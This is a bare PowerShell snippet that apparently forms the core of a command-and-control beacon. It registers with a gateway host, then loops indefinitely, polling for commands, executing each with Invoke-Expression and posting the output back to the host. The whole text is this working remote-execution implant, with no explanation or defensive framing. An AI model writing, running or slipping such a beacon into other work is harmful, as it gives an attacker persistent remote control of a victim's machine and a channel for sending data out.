$response = Invoke-RestMethod -Uri "https://$Gateway/api/register" -Method Post
while ($true) {
    $response = Invoke-RestMethod -Uri "https://$Gateway/api/poll" -Method Post
    $output = Invoke-Expression $response.command
    Invoke-RestMethod -Uri "https://$Gateway/api/report" -Method Post -Body $output
}
